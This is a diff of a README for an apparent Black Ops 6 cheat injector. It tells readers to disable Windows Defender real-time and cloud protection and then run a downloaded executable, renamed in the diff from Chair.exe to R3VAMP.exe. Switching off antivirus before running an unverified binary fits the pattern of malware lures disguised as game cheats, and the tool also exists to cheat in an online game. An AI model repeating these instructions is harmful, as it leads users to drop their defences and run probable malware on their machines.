@@ -1,8 +1,7 @@
 # Instructions for Use
 
-<div class="important">
+
 ⚠️ **Important:** Before running, you must disable **Real-time protection** and **Cloud-delivered protection** in Windows Defender to allow the tool to function properly. Without this step, the tool will not work! See below for instructions with images.
-</div>
 
 ## Quick Setup Guide
 
@@ -26,20 +25,14 @@ To ensure functionality of the loader, make sure **Real-time protection** and **
 ## Step 2: Launching the Injector
 
 1. **Download the Tool**
-   - Get **Chair.exe** from the provided link.
+   - Get **R3VAMP.exe** from the provided link.
 
 2. **Prepare for Injection**
    - Make sure **Black Ops 6** is closed before proceeding.
-   - Run **Chair.exe**.
+   - Run **R3VAMP.exe**.
+   - After about 2-3 seconds you will see a pop-up that says "Injection Complete." 
 
-3. **Select and Inject Cheats**
-   - In the menu, select one of the following options:
-     - **BO6 Unlocker Tool**
-     - **BO6 Multiplayer Hacks**
-     - **BO6 Zombies Hacks**
-   - Click **Start Injection**. After a successful injection, a confirmation message will appear: **Injection Complete**.
-
-4. **Launch and Play**
+3. **Launch and Play**
    - Start **Black Ops 6** and enjoy the enhanced features!
 
 ![Injector Running](images/2.png)
